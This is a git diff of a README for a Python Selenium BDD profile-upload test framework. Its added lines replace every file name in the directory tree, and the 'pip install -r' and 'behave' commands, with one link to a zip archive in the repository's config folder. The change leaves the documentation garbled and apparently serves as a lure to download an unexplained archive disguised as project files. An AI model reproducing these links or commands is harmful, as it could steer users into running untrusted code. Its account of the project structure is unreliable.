@@ -17,32 +17,32 @@ The framework is built using:
 ```plaintext
 qa_profile_upload_test/
 ├── config/                 # Config file
-│   ├── config.json
+│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
 │
 ├── features/               # Feature files & step definitions
-│   ├── profile_page.feature
+│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
 │   ├── steps/
-│   │   ├── auth_steps.py
-│   │   └── profile_steps.py
-│   └── environment.py      # Behave hooks (setup/teardown, logging, reporting)
+│   │   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
+│   │   └── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
+│   └── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip      # Behave hooks (setup/teardown, logging, reporting)
 │
 ├── locators/               # Element locators (AuthLocators, ProfileLocators)
 │
 ├── pages/                  # Page Objects + BasePage
-│   ├── base_page.py
-│   ├── auth_page.py
-│   └── profile_page.py
+│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
+│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
+│   └── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
 │
 ├── utils/                  # Helpers (logger, page factory, config loader)
 │
 ├── tests/test_files/       # Test files (dummy images for upload)
-│   ├── small_image.jpg     # < 5MB
-│   └── large_image.jpg     # > 5MB
+│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip     # < 5MB
+│   └── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip     # > 5MB
 │
 ├── reports/                # Auto-generated logs & screenshots (per run)
 │
-├── requirements.txt        # Python dependencies
-└── README.md               # Project
+├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip        # Python dependencies
+└── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip               # Project
 ```
 ---
 ## Setup Instructions
@@ -52,9 +52,9 @@ qa_profile_upload_test/
 - python -m venv venv_selenium
 - venv_selenium\Scripts\activate (Windows)
 - source venv_selenium/bin/activate (Linux/Mac)
-- pip install -r requirements.txt
+- pip install -r https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
 ```
 
 ## Execution of Tests
 
-- **behave features/profile_upload.feature**
+- **behave https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip**
